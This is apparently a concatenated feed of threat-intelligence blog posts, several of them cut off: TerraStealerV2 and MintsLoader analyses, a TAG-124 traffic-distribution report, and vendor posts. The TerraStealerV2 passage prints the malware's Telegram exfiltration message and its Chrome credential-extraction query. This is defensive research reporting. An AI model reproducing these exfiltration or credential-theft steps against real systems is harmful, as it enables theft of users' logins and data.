100%;">chat_id=-4652754121&text=%2A%2ANew%20User%20Ran%20the%20Application%2A%2A%0A%2A%2AUsername%3A%2A%2A%20Admin%0A%2A%2APC%20Name%3A%2A%2A%20UUHJKMQK%0A%2A%2AIP%20Address%3A%2A%2A%20%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text%2Fhtml%3B%20charset%3DUTF-8%22%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22content-style-type%22%20content%3D%22text%2Fcss%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22content-script-type%22%20content%3D%22text%2Fjavascript%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22content-language%22%20content%3D%22en%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22pragma%22%20content%3D%22no-cache%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22cache-control%22%20content%3D%22no-cache%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20name%3D%22description%22%20content%3D%22Get%20my%20IP%20Address%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20name%3D%22keywords%22%20content%3D%22ip%20address%20ifconfig%20ifconfig.me%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20name%3D%22author%22%20content%3D%22%22%20%2F%3E%0A%20%20%20%20%3Clink%20rel%3D%22shortcut%20icon%22%20href%3D%22favicon.ico%22%20%2F%3E%0A%20%20%20%20%3Clink%20rel%3D%22canonical%22%20href%3D%22https%3A%2F%2Fifconfig.me%2F%22%20%2F%3E%0A%20%20%20%20%3Ctitle%3EWhat%20Is%20My%20IP%20Address%3F%20-%20ifconfig.me%3C%2Ftitle%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%22%3E%0A%20%20%20%20%3Clink%20href%3D%22.%2Fstatic%2Fstyles%2Fstyle.css%22%20rel%3D%22stylesheet%22%20type%3D%22text%2Fcss%22%3E%0A%20%20%20%20%3Clink%20href%3D%22https%3A%2F%2Ffonts.googleapis.com%2Fcss%3Ffa      </pre>    </td>  </tr></table><em><strong>Figure 5:</strong> TerraStealerV2 exfiltrating initial data to Telegram (Source: <a href="https://tria.ge/250304-1eba9a1xay/behavioral2" target="_blank">Recorded Future</a>)</em><br><br><p>URL decoding the message&#39;s POST data reveals that the threat actor sends a structured notification to a Telegram channel.

This behavior is likely intended to release any file locks on Chromes browser database files, ensuring unobstructed access during data extraction. Following this, the malware attempts to extract stored credentials and other sensitive data from Chrome and targets specific cryptocurrency wallets and browser extensions.</p><p>The Chrome browser database theft implementation copies the &quot;Login Data&quot; database to <span style="font-family:courier;">C:ProgramData\Temp\LoginData</span> and then extracts saved logins using a statically linked SQLite library to execute the SQL query <span style="font-family:courier;">SELECT origin_url</span>, <span style="font-family:courier;">username_value</span>, <span style="font-family:courier;">password_value FROM logins</span>. TerraStealerV2 uses SQLite version 3.46.0, which is the same version statically linked in RevC2, suggesting possible code reuse or shared development practices. However, the implementation does not bypass Chromes ABE, meaning collected passwords will not be decrypted for any hosts with Chrome-based browsers updated since July 24, 2024. This limitation suggests that the stealer code is outdated or still under active development, as effective stealers typically incorporate ABE bypass techniques to extract decrypted credentials from modern versions of Chrome or Microsoft Edge.</p><p>Exfiltrated browser login data and informational messages are written to <span style="font-family:courier;">C:\ProgramData\file.txt</span> and copied to <span style="font-family:courier;">%LOCALAPPDATA%\Packages\Bay0NsQIzx\p.txt</span> when stealing operations have completed.

            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt group logo"></p><h2 id="executive-summary">Executive Summary</h2><p>MintsLoader, a malicious loader, was first observed in multiple phishing and drive-by download campaigns as early as 2024. The loader commonly deploys second-stage payloads such as GhostWeaver, StealC, and a modified BOINC (Berkeley Open Infrastructure for Network Computing) client. MintsLoader operates through a multi-stage infection chain involving obfuscated JavaScript and PowerShell scripts. The malware employs sandbox and virtual machine evasion techniques, a domain generation algorithm (DGA), and HTTP-based command-and-control (C2) communications.</p><p>MintsLoader has been observed being used by various threat groups; however, operators of TAG-124 (also known as LandUpdate808) have used it extensively. The loader is deployed through multiple infection vectors, including phishing emails targeting the industrial, legal, and energy sectors (TAG-124); compromised websites impersonating browser update prompts (SocGholish); and invoice-themed lures distributed via Italys PEC certified email system.</p><p>MintsLoaders use of obfuscation complicates static detections such as YARA rules, its use of DGA-based C2 infrastructure makes it difficult to maintain up-to-date watchlists or blocklists, and its anti-analysis techniques complicate host-based detections that rely on sandboxes or virtualization. But Recorded Futures Malware Intelligence Hunting identifies new MintsLoader samples and associated C2 domains and provides an up-to-date list for blocklists or threat hunting.</p><p>MintsLoaders persistent use of obfuscation, sandbox evasion, and adaptive infrastructure likely ensures its continued presence within the malware ecosystem, likely leading to increased use by additional threat actors. The malwares role as a versatile delivery mechanism reflects the increasing professionalization and specialization within the cybercriminal community. While this growing sophistication benefits threat actors by enabling more resilient and efficient operations, it may simultaneously provide opportunities for defenders to identify and disrupt malicious activity more effectively and at scale.</p><h2 id="key-findings">Key Findings</h2><ul><li>MintsLoader&#39;s second-stage PowerShell script uses sandbox and virtual environment evasion techniques, reducing its susceptibility to automated analysis and increasing its likelihood of bypassing dynamic detection tools.</li><li>MintsLoader&#39;s use of a DGA to generate daily C2 domains based on the system date complicates infrastructure monitoring activity and domain/IP-based detections. </li><li>Recorded Futures Malware Intelligence Hunting provides up-to-date C2 domains and other artifacts related to MintsLoader that would otherwise be hard to track due to its dynamic infrastructure.</li><li>Insikt Group shows that GhostWeaver is the primary payload deployed by MintsLoader across observed campaigns.</li><li>GhostWeavers self-signed X.509 certificates are similar to those of AsyncRAT and variants of AsyncRAT, leading to initial false associations with other malware families such as AsyncRAT.</li></ul><h2 id="background">Background</h2><p><a href="https://github.com/cert-orangecyberdefense/mintsloader" target="_blank">Orange Cyberdefense</a> first detected MintsLoader in widespread distribution campaigns between July and October 2024. Insikt Group identified earlier campaigns in February 2024, based on Palo Altos Unit42 <a href="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2024-02-21-IOCs-from-SocGholish-AsyncRAT-infection.txt" target="_blank">analysis</a> of a SocGholish infection. </p><p>The loader consists of JavaScript (stage one) and PowerShell (stage two) scripts retrieved from multiple DGA-based domains. The name MintsLoader is derived from its distinctive use of the URL parameter <span style="font-family:courier;">s=mints[NUMBER]</span> (for example, <span style="font-family:courier;">s=mints11</span>). MintsLoader is typically <a href="https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983" target="_blank">observed</a> in campaigns delivering secondary payloads such as GhostWeaver, StealC, and the Berkeley Open Infrastructure for Network Computing (BOINC) client. </p><p><img src="https://cms.recordedfuture.com/uploads/malware_hunting_001_49740c53e8.png" alt="malware-hunting-001.png"><em><strong>Figure 1:</strong> MintsLoader profile (Source: Recorded Future)</em></p><p>While MintsLoader is believed to be used by multiple threat actors, TAG-124 (also known as LandUpdate808) infections have frequently been observed deploying MintsLoader. Additionally, threat actors using SocGholish were early adopters of MintsLoader, resulting in the initial assessment of MintsLoader campaigns as being exclusively associated with SocGholish. For example, in February 2024, Palo Altos Unit42 <a href="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2024-02-21-IOCs-from-SocGholish-AsyncRAT-infection.txt" target="_blank">released</a> indicators linked to SocGholish (Figure 2); however, Insikt Group&#39;s analysis indicates that the URLs identified as delivering AsyncRAT also align with known MintsLoader URL patterns. </p><p><img src="https://cms.recordedfuture.com/uploads/malware_hunting_002_3aaff8bc04.png" alt="malware-hunting-002.png"><em><strong>Figure 2:</strong> Palo Alto SocGholish infection IoCs (Source: Recorded Future)</em></p><p>Similarly, in July 2024, Huntress Labs <a href="https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software" target="_blank">reported</a> a SocGholish infection delivering a BOINC client. Notably, the URL used to download the BOINC matches known MintsLoader URL patterns. <strong>Figure 3</strong> shows a high-level overview of the threat actors that use MintsLoader.</p><p><img src="https://cms.recordedfuture.com/uploads/malware_hunting_003_004b3672bd.png" alt="malware-hunting-003.png"><em><strong>Figure 3:</strong> Threat actors&#39; use of MintsLoader (Source: Recorded Future)</em></p><p>Below are recently reported campaigns involving MintsLoader.</p><h3 id="mintsloader-and-kongtukeclickfix-pages">MintsLoader and Kongtuke/ClickFix pages</h3><p>In early 2025, security analysts <a href="https://www.esentire.com/blog/mintsloader-stealc-and-boinc-delivery" target="_blank">observed</a> a phishing campaign delivering MintsLoader as a first-stage loader. Phishing emails (targeting the energy, oil and gas, and legal sectors in the US and Europe) carried either a malicious JavaScript attachment or a link to a fake Click to verify web page. <strong>Figure 4</strong> shows examples of ClickFix pages.</p><p><img src="https://cms.recordedfuture.com/uploads/malware_hunting_004_6a36ae37af.png" alt="malware-hunting-004.png"><em><strong>Figure 4:</strong> Examples of ClickFix pages (Source: <a href="https://www.hhs.gov/sites/default/files/clickfix-attacks-sector-alert-tlpclear.pdf" target="_blank">https://www.hhs.gov/</a>)</em></p><p>In both cases, the result was the execution of MintsLoaders PowerShell-based second stage on the victims machine. This loader pulled down the final payloads, notably the StealC infostealer and a modified BOINC client build. The <a href="https://thehackernews.com/2025/01/mintsloader-delivers-stealc-malware-and.html" target="_blank">campaign</a> leveraged fake CAPTCHA verification pages (ClickFix/KongTuke lures) to trick users into executing a copied PowerShell command, which downloaded and ran MintsLoader (<strong>Figure 5</strong>).</p><p><img src="https://cms.recordedfuture.com/uploads/malware_hunting_005_8dda62e4fa.png" alt="malware-hunting-005.png"><em><strong>Figure 5:</strong> MintsLoader ClickFix infection chain (Source: Recorded Future)</em></p><p>Other <a href="https://www.esentire.com/blog/mintsloader-stealc-and-boinc-delivery" target="_blank">infection</a> chains in this campaign delivered MintsLoader via a downloaded <span style="font-family:courier;">Fattura########.js</span> file (Italian for invoice) that victims opened, leading to the same PowerShell loader execution. Researchers at eSentires Threat Response Unit reported this campaign and noted the threat actors focus on industrial and professional services targets across North America and Europe.</p><h3 id="socgholish-fakeupdates-campaigns">SocGholish FakeUpdates Campaigns</h3><p>Multiple reports indicate (<a href="https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983" target="_blank">1</a>, <a href="https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software#:~:text=Beginning%20on%20July%204%2C%202024%2C,such%20as%20AsyncRAT%20or%20NetSupport" target="_blank">2</a>) that the SocGholish (FakeUpdates) threat actors incorporated MintsLoader into their operations.

Spam messages leveraged Italys PEC (certified email) system to add legitimacy and lured recipients into opening attached JavaScript files masquerading as invoices. The Spamhaus research team dubbed this the PEC invoice scam and highlighted how the attackers abused trusted email channels to bypass security checks. This campaign was noted for stealing time, money, and trust from businesses.</p><p><img src="https://cms.recordedfuture.com/uploads/malware_hunting_007_88a6c3c7e0.png" alt="malware-hunting-007.png"><em><strong>Figure 7:</strong> PEC phishing email (Source: <a href="https://www.spamhaus.org/resource-hub/cybercrime/pec-invoice-scam/#not-the-same-campaign-again" target="_blank">Spamhaus</a>)</em></p><h2 id="technical-analysis">Technical Analysis</h2><p>MintsLoader uses a multi-stage execution chain involving JavaScript and PowerShell, with each stage employing obfuscation to hinder analysis. Although MintsLoader functions solely as a loader without supplementary capabilities, its primary strengths lie in its sandbox and virtual machine evasion techniques and a DGA implementation that derives the C2 domain based on the day it is run. These features significantly complicate static analysis and host-based detection. Despite this, its C2 communications occur over HTTP, which provides a reliable vector for detecting and identifying new samples. <strong>Figure 8</strong> provides the high-level capabilities of MintsLoader.</p><p><img src="https://cms.recordedfuture.com/uploads/malware_hunting_008_18871d3457.png" alt="malware-hunting-008.png"><em><strong>Figure 8:</strong> MintsLoader high-level capabilities (Source: Recorded Future)</em></p><p>This analysis of MintsLoader includes details on the first- and second-stage payloads and MintsLoader infrastructure.</p><h2 id="mintsloader-attack-chain">MintsLoader Attack Chain</h2><p>MintsLoader is commonly delivered via phishing emails containing links to KongTuke or ClickFix pages. When executed, these pages retrieve and run the first stage of JavaScript. The JavaScript is heavily obfuscated, and execution leads to running a PowerShell command to download and execute the second stage of MintsLoader, as shown in <strong>Figure 9</strong>.</p><p><img src="https://cms.recordedfuture.com/uploads/malware_hunting_009_a7599f2c0f.png" alt="malware-hunting-009.png"><em><strong>Figure 9:</strong> First stage of MintsLoader infection (Source: <a href="https://tria.ge/250303-rmy8lsznz9/behavioral2" target="_blank">Recorded Future Malware Intelligence</a>)</em></p><p>This second stage conducts environment checks to determine whether it is running in a sandbox or virtualized setting. Next, the script uses a DGA to produce the next C2 domain. MintsLoader then attempts to contact the generated domain to download the final payload, such as GhostWeaver, StealC, or the BOINC client. Figure 10 shows a high-level overview of this attack chain.</p><p><img src="https://cms.recordedfuture.com/uploads/malware_hunting_010_f7eb608c62.png" alt="malware-hunting-010.png"><em><strong>Figure 10:</strong> Common MintsLoader infection chain (Source: Recorded Future)</em></p><h2 id="stage-one-javascript">Stage One: JavaScript</h2><p>The initial stage of MintsLoader consists of a JavaScript file that executes a PowerShell command to retrieve the second stage. The script is heavily obfuscated using junk comments, non-readable variables and function names, character replacement, and string encoding (<strong>Figure 11</strong>).

            <description><![CDATA[Recorded Futureâs Malware Intelligence rethinks traditional malware analysis to empower organizations to act first against modern threats.]]></description>
            <content:encoded><![CDATA[<p>In my conversations with security leaders across industries, I hear a consistent theme: traditional approaches to malware detection and analysis are failing to keep pace with the evolving threat landscape. This challenge has become even more pronounced as adversaries increasingly leverage AI to accelerate and enhance their attacks.</p><p>The statistics tell a sobering story. The average dwell time for threats in 2024 remains at approximately 10 days. Nearly half of CISOs report missing data breaches with their existing security tools. And 93% of malware hides in data-in-transit<sup>1</sup>. These aren&#39;t just numbersthey represent real business risk that security teams struggle to address with limited resources and reactive approaches.</p><p>Today, I&#39;m excited to announce a solution that fundamentally transforms how organizations defend against malware: <strong>Recorded Future&#39;s Malware Intelligence</strong>. </p><h2 id="beyond-isolated-analysis">Beyond Isolated Analysis</h2><p>Traditional malware analysis happens in isolationdisconnected from the broader threat landscape. Security teams spend countless hours manually investigating samples without the contextual intelligence needed to understand their true risk or deploy effective protections quickly.</p><p>Malware Intelligence fundamentally changes this approach by connecting every malware sample to our Intelligence Graph&#39;s 15+ years of threat and malware data. This allows security teams to not just analyze what the malware does, but understand its lineage, predict its evolution, and automatically generate protectionsgiving you complete context and automated defenses in seconds rather than days.</p><h2 id="the-power-of-the-intelligence-graph">The Power of the Intelligence Graph</h2><p>What makes this approach possible is the Recorded Future Intelligence Graphthe world&#39;s only threat intelligence repository with over 200 billion nodes of interconnected data built over 15 years. By leveraging this unmatched intelligence foundation, we&#39;ve created capabilities that transform malware defense from a reactive exercise to a proactive strategy:</p><ol><li><strong>Intelligence Graph correlation</strong> with 1.5M+ new malware samples/day providing immediate context about origins, attribution, and potential impact</li><li><strong>Auto YARA rule generation</strong> powered by pattern recognition creates instant protection against identified threats and their variants</li><li><strong>Dynamic alerting</strong> identifies emerging threats through static and behavioral analysis before they target your organization</li><li><strong>Seamless integration</strong> with existing security controls enables immediate protection without workflow disruption</li><li><strong>Advanced Sandbox</strong> empowers security teams to upload and and detonate potential malware in an interactive environment, unlocking deep insights into threat behavior and attack strategies - <a href="https://www.recordedfuture.com/get-started#free-tools">try it free today</a> and see the difference.</li></ol><h2 id="transforming-cyber-operations">Transforming Cyber Operations</h2><p>For security teams, the impact is transformative. One customer described our approach as making their team &quot;look prophetic&quot;they could get out in front of threats before they materialized rather than constantly reacting to incidents.</p><p>Early adopters are reporting remarkable results including 3x reduction in triage time and ability to run threat hunts automatically.</p><p>These aren&#39;t just efficiency metricsthey represent a fundamental shift in how security teams operate and the level of protection they can provide to their organizations.</p><h2 id="from-manual-to-automated-from-reactive-to-proactive">From Manual to Automated, From Reactive to Proactive</h2><p>What excites me most about Malware Intelligence is how it addresses the critical challenges facing security teams today:</p><ul><li><strong>For resource-constrained teams</strong>, it provides automation that eliminates hours of manual rule-writing and scales threat hunting capabilities without adding headcount</li><li><strong>For organizations struggling with alert fatigue</strong>, it delivers high-confidence intelligence that focuses teams on what matters most</li><li><strong>For security leaders concerned about emerging threats</strong>, it provides predictive capabilities that identify variants before they impact your systems</li></ul><p>Most importantly, it enables security teams to shift from a reactive posturewhere they&#39;re constantly on the back foot against attackersto a proactive strategy where they can anticipate and prevent attacks before they occur.</p><h2 id="the-future-of-intelligence-driven-security">The Future of Intelligence-Driven Security</h2><p>Malware Intelligence represents a significant step in our vision to enable you to know what matters and act first. By connecting the dots between isolated malware samples and the broader threat landscape, we&#39;re enabling security teams to defend at the speed and scale that modern threats demand.</p><p>As attack techniques continue to evolve with the aid of AI, the advantage will belong to those with superior intelligence capabilities. That&#39;s precisely what we&#39;re delivering with Malware Intelligencea capability that transforms how organizations detect, understand, and respond to malware threats that matter most to their business.</p><p>This is available today for all our customers who own our Threat Intelligence Module.

            <description><![CDATA[Drowning in security data but missing real threats? Learn how threat actors exploit this paradoxâand how to turn your data into actionable intelligence.]]></description>
            <content:encoded><![CDATA[<p>Security teams are drowning in data, yet many struggle to extract actionable insights. As threats grow more complex, the <a href="https://www.cisa.gov/resources-tools/resources/enhanced-visibility-and-hardening-guidance-communications-infrastructure" target="_blank">demand</a> for visibility has never been greater. But more data does not always mean better security outcomes. 63% of daily alerts are low priority or false positives, causing SOC analysts to <a href="https://panther.com/blog/identifying-and-mitigating-false-positive-alerts#:~:text=found%20that%20an%20estimated%20one%2Dthird%20of%20their%20workday%20is%20spent%20on%20incidents%20that%20are%20not%20real%20threats%2C%20with%20FP%20and%20low%2Dpriority%20alerts%20comprising%20roughly%2063%25%20of%20daily%20alerts." target="_blank">report</a> spending nearly a third of their time on incidents that pose no real threat. At the same time, 58% of analysts <a href="https://finitestate.io/blog/industry-report-false-positives-software-security#:~:text=58%25%20said%20false%20positives%20take%20more%20time%20to%20resolve%20than%20true%20positives" target="_blank">report</a> that false positives take more time to resolve than actual threats. Without the right tools and methods to interpret this information, more data just means more noise. This results in a visibility paradox: the more security data that is collected, the harder it becomes to spot real threats.</p><h2 id="how-threat-actors-exploit-the-visibility-paradox">How Threat Actors Exploit the Visibility Paradox</h2><p>Threat actors are capitalizing on this paradox. Recorded Futures analysis of tactics, techniques, and procedures (TTPs) shows that threat actors are exploiting everyday traffic patterns and system behaviors to operate undetected, effectively hiding in plain sight.</p><ul><li><strong>250% Spike in Camouflaged Communication:</strong> The use of the application layer protocol (T1071) for command-and-control operations, disguised as routine network traffic, increased by over 250% between 2023 and 2024. Nearly half of all data exfiltration incidents tracked by Recorded Future in 2024 involved this technique.</li><li><strong>Use of Malicious Infrastructure to Blend in with Web Traffic:</strong> Multiple threat actors are taking <a href="https://www.recordedfuture.com/research/tag-124-multi-layered-tds-infrastructure-extensive-user-base" target="_blank">advantage</a> of specialized malicious traffic-distribution systems that rapidly rotate URLs to evade static blocking mechanisms. This allows malicious infrastructure to mimic legitimate web activity and bypass conventional defenses.</li><li><strong>33% Increase in System Information Discovery:</strong> Between 2023 and 2024, there was an uptick in the use of discovery tactics that allow threat actors to map and understand the target environment. System information discovery enables defense evasion techniques that commonly appear in ransomware, like disabling or modifying tools or modifying registry.</li></ul><p>Threat actors often rotate through indicators such as IP addresses, file hashes, and domains, reducing the effectiveness of static detections. Without careful tuning, alerts triggered by suspicious discovery or C2 behavior can generate high levels of false positives on legitimate processes or normal network traffic.</p><h2 id="automation-and-specialization-create-even-more-noise">Automation and Specialization Create Even More Noise</h2><p>Two trends are likely to fuel an increase in this activity. First, threat actors are specializing more than ever, allowing for sophisticated exploits across specific areas of the cyber kill chain. The <a href="https://www.recordedfuture.com/research/initial-access-brokers-key-to-rise-in-ransomware-attacks" target="_blank">rise</a> of initial access brokers and recent <a href="https://www.darkreading.com/threat-intelligence/vextrio-tds-biggest-cybercrime-operation-web" target="_blank">discoveries</a> of specialized access and C2 infrastructure highlight this shift. Second, threat actors are increasingly using AI tools. While malware isnt autonomous yet, threat actors are exploiting LLMs and machine learning to automate and randomize delivery infrastructure, such as by <a href="https://blogs.infoblox.com/threat-intelligence/rdgas-the-next-chapter-in-domain-generation-algorithms/" target="_blank">registering</a> thousands of unique domain names daily for malicious use. The volume and randomness make these domains extremely difficult to detect or block.</p><h2 id="beat-the-paradox-by-making-the-most-of-data">Beat the Paradox by Making the Most of Data</h2><p>Behavior-based detection, rather than static indicators, is pivotal to catching these threats. However, collecting enough data to understand behavior can exacerbate the visibility paradox if defenders dont have a strategy for making sense of their alerts. This is where better analytics and intelligence-driven hunting can help:</p><ul><li><strong>Understand what is normal in your systems:</strong> Detecting subtle anomalies requires a deep understanding of baseline network behavior, also known as <a href="https://www.blackfog.com/cybersecurity-101/baselining" target="_blank">baselining</a>. Without this, deviations can go unnoticed.</li><li><strong>Integrate your tools:</strong> Avoid alerting silos. Centralizing and enriching data in a unified platform, such as - Recorded Futures Collective Insights tool, helps surface more meaningful signals.</li><li><strong>Test alerts with intelligence-driven hunts:</strong> Purple teaming, a method of vulnerability assessment that combines data from red- and blue-team exercises to improve network defense, helps to verify detection capabilities. Red teams can use real-world threat intelligence to simulate the most relevant threats to your company based on activity observed in your industry or region.</li></ul><h2 id="the-bottom-line-for-security-leaders">The Bottom Line for Security Leaders</h2><p>The organizations that will succeed in the years ahead won&#39;t be those collecting the most data, instead it will be the ones best equipped to turn that data into action. Recorded Future helps security teams beat the visibility paradox by providing the tools, automation, and intelligence needed to cut through the noise and focus on real threats before they impact your business.

            <description><![CDATA[Discover how cybercriminals use malicious Traffic Distribution Systems like TAG-124 to deliver ransomware and malware to high-value targets in healthcare and critical infrastructure.]]></description>
            <content:encoded><![CDATA[<p>Coming across highly targeted advertisements online is a common experience for many US consumers. One way advertisers achieve this is by using traffic distribution systems (TDSs), which collect information about potential customers to <a href="https://www.securitee.org/files/tds-www2021.pdf" target="_blank">direct</a> them to highly targeted ads. Using data from the users browser, geolocation, and behavior, a TDS makes rapid decisions on directing traffic to get the most from ad spend. However, cybercriminals also use this infrastructure to deliver highly targeted malware to victims who are most likely to click their links. Malicious TDSs work in much the same way as legitimate TDSs, except they direct victims to the most effective malware instead of the most effective advertisement. Additionally, these TDSs provide a defensive measure to ensure the malware is not delivered to researchers or sandboxes that could analyze the code.</p><p>Insikt Group has been tracking how cybercriminals use these tools and <a href="https://www.recordedfuture.com/research/tag-124-multi-layered-tds-infrastructure-extensive-user-base" target="_blank">identified</a> infrastructure linked to a highly active malicious TDS dubbed TAG-124. TAG-124 allows ransomware operators and other cybercriminals to maximize their chances of infecting their intended victims with their respective payloads. At least two ransomware groups have been observed using TAG-124 to infect victims in health care and other critical infrastructure, demonstrating the value of traffic distribution for big game hunting (targeting companies perceived as likely to pay out high extortion demands). While shared infrastructure like TAG-124 helps cybercriminals improve their efficiency and effectiveness, understanding TAG-124 infrastructure can help defenders block or even disable activity from multiple cyber threat actors simultaneously before compromise occurs.</p><p><img src="https://cms.recordedfuture.com/uploads/hidden_01_4f5a2dd0de.png" alt="hidden-01.png"><em><strong>Figure 1:</strong> Multiple threat actors use TAG-124 to direct victims to their malware (Source: Recorded Future)</em></p><h2 id="multiple-threat-actors-use-tag-124-infrastructure">Multiple Threat Actors Use TAG-124 Infrastructure</h2><p>Insikt Group has observed multiple threat actors using this malicious TDS, including:</p><ul><li><strong>Rhysida Ransomware:</strong> A sophisticated <a href="https://www.recordedfuture.com/research/outmaneuvering-rhysida-advanced-threat-intelligence-shields-critical-infrastructure-ransomware" target="_blank">ransomware-as-a-service</a> operation notable for extorting healthcare organizations and other critical infrastructure. In 2023, the group claimed responsibility for an attack on Prospect Medical Holdings, which <a href="https://www.scworld.com/news/rhysida-claims-responsibility-for-ransomware-attacks-on-prospect-medical-holdings" target="_blank">resulted</a> in the theft of over 500,000 social security numbers and <a href="https://blog.barracuda.com/2024/05/09/rhysida-ransomware--the-creepy-crawling-criminal-hiding-in-the-d#:~:text=The%20Prospect%20Medical%20Holdings%20attack%20impacted%2017%20hospitals%20and%20166%20clinics%20across%20the%20United%20States." target="_blank">impacted</a> operations at seventeen hospitals and 166 clinics. </li><li><strong>Interlock Ransomware:</strong> Another ransomware group targeting primarily <a href="https://www.hipaajournal.com/interlock-ransomware-healthcare/" target="_blank">healthcare organizations</a> and other big game to extort higher payouts through high-impact attacks on large organizations. In December 2024, the group <a href="https://www.bleepingcomputer.com/news/security/texas-tech-university-system-data-breach-impacts-14-million-patients/" target="_blank">claimed</a> credit for an attack on the Texas Tech University Health Sciences Center, stealing 2.6 TB of sensitive personal data. Interlock shares many similarities with Rhysida, such as tactics, tools, and encryption behaviors, though the exact relationship between the two is <a href="https://x.com/prodaft/status/1896938856672280591?s=43" target="_blank">unknown</a>.</li><li><strong>TA866 / Asylum Ambuscade:</strong> This cybercrime group <a href="https://www.welivesecurity.com/2023/06/08/asylum-ambuscade-crimeware-or-cyberespionage/" target="_blank">engages in</a> financial targeting and cyber espionage very likely on behalf of the Russian government. The group has targeted bank customers and cryptocurrency traders across North America and Europe and carried out <a href="https://www.proofpoint.com/us/blog/threat-insight/security-brief-ta866-returns-large-email-campaign" target="_blank">espionage</a> against government entities in Europe, Central Asia, and other areas.</li></ul><p>TAG-124 has also been associated with <a href="https://www.proofpoint.com/us/blog/threat-insight/part-1-socgholish-very-real-threat-very-fake-update" target="_blank">SocGholish</a> and <a href="https://www.esentire.com/blog/exploring-the-d3f-ck-malware-as-a-service-loader" target="_blank">D3F@ck</a> loader malware, which provide remote access and malware delivery for financially motivated activity. While Insikt Group does not know which criteria TAG-124 uses to filter and direct malicious content, its use of search engine optimization (SEO) poisoning and infecting legitimate sites allows for an enormous number of potential victims. By outsourcing initial infection to TAG-124, groups like Rhysida and Interlock can pursue big game hunting by specializing in techniques implemented during a later stage in the infection kill chain. These special techniques enable more effective extortion campaigns.</p><h3 id="risk-outlook">Risk Outlook</h3><p>Successful big game hunting that results in large payouts allows sophisticated syndicates like Rhysida and Interlock to invest back into services that make their work more effective. This drives the increased specialization of groups like TAG-124, creating a virtuous cycle of cybercrime. As a result, businesses face an increasing risk of high-impact ransomware attacks and espionage-driven data theft: the links between TAG-124 and Asylum Ambuscade suggest that state-sponsored threat actors are also taking advantage of these services in addition to profit-motivated actors.</p><p>Defending against TAG-124 may be challenging due to its early role in the cyberattack life cycle, but missing intrusions early on can still have negative consequences for companies. For example, one of Rhysidas latest victims, Sunflower Medical, is <a href="https://www.hipaajournal.com/sunflower-medical-group-data-breach-lawsuit/" target="_blank">facing</a> a class action lawsuit because of its failure to implement security measures that would have detected the breach early in the infection cycle. According to the company, the intrusion was not discovered for three weeks following the initial breach. While it is unknown whether TAG-124 was used for this intrusion, the legal consequences demonstrate the significant risks of missing early signs of a breach.</p><h3 id="mitigations">Mitigations</h3><p>TAG-124 is not the only TDS operating on behalf of threat actors. Other notable examples include <a href="https://www.darkreading.com/threat-intelligence/vextrio-tds-biggest-cybercrime-operation-web" target="_blank">VexTrio</a>, <a href="https://www.securityweek.com/prometheus-tds-underground-service-distributing-several-malware-families/" target="_blank">Prometheus TDS</a>, and <a href="https://sensorstechforum.com/blacktds-traffic-distribution-network-malicious/" target="_blank">BlackTDS</a>, all of which offer competing malware delivery capabilities. Operators of these systems enable the increasing effectiveness of many different threat actors  primarily criminal, though occasionally state-sponsored  by providing professional infrastructure that adopts legitimate content delivery techniques for criminal use. However, identifying indicators of malicious TDS can help defenders detect and block multiple threat actors early in the attack kill chain.</p><p>Insikt Group recommends the following measures:</p><ul><li><strong>Advanced threat detection:</strong> In addition to blocking known indicators, use host- and log-based detections, such as YARA, Snort, and Sigma rules found in Recorded Futures Intelligence Cloud, for custom file scanning and detection. These detections can help identify unwanted tools or other suspicious activity.</li><li><strong>User education:</strong> Educate users on the risks of SEO poisoning and urge caution when browsing. In particular, urge caution against unprompted downloads for Google Chrome updates and other indicators associated with TAG-124 infrastructure.</li><li><strong>Secure browser setting:</strong> Enable automatic browser updates and blocking pop-ups to reduce exposure to malicious update prompts.</li></ul><p>For more information on TAG-124 and other emerging threats in malware, check out Insikt Groups <a href="https://www.recordedfuture.com/research/2024-malicious-infrastructure-report" target="_blank">2024 Malicious Infrastructure Report</a>.</p>]]></content:encoded>

It is another reminder that in today&#39;s rapidly evolving cybersecurity environment, organizations cannot afford to rely on a single stream of intelligence. It also demonstrates why platforms that aggregate multiple intelligence sources are more critical than ever. </p><h2 id="when-critical-vulnerability-information-sources-are-at-risk">When Critical Vulnerability Information Sources Are at Risk</h2><p>We tend to think about supply chain disruptions related to physical goods, but this is a wake up call that information supply chains are equally important to consider. </p><p>So what happened? On April 15, 2025, a memo indicated that MITRE&#39;s contract to support CVE (Common Vulnerabilities and Exposures) and related programs was set to expire on April 16, 2025. Fortunately, by 9am EDT on April 16, the MITRE contract had reportedly been renewed, and there would be no actual impact or interruptions to vulnerability intelligence services for at least a year- beyond that year is still unknown. While this raised immediate concerns across the cybersecurity community, it also illustrated the importance of diversified <a href="https://www.recordedfuture.com/products/vulnerability-intelligence" target="_blank">vulnerability intelligence</a> sources. </p><h2 id="why-multi-source-vulnerability-intelligence-matters">Why Multi-Source Vulnerability Intelligence Matters</h2><p>The MITRE situation perfectly exemplifies why organizations need robust, multi-source intelligence platforms rather than a dependency on single sources, namely:</p><h3 id="resilience-against-source-disruptions">Resilience Against Source Disruptions</h3><p>When a key intelligence source experiences disruption, organizations with diversified sources can maintain operational continuity.</p><h3 id="comprehensive-coverage">Comprehensive Coverage</h3><p>Different intelligence sources often capture different aspects of 